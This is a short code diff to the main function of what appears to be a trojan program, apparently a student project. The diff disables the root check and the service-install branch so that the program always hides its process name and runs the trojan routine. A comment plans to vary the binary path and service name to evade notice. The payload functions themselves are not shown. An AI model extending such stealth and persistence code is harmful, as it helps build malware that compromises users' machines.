@@ -77,16 +77,17 @@ void	exec_troyan(void)
 
 int main(int argc, char **argv)
 {
-	if (geteuid() != 0) {
+	(void) argc;
+	/* if (geteuid() != 0) {
 		ft_dprintf(2, "Error: not running as root\n");
 		return (1);
 	}
 	if (need_to_install_server()) {
 		install_server(argc, argv);
-	} else {
+	} else { */
 		hide_process_name(argv); //TODO maybe change more things, like bin path and service name during install???
 		exec_troyan();
-	}
+	//}
 	return (0);
 }
 
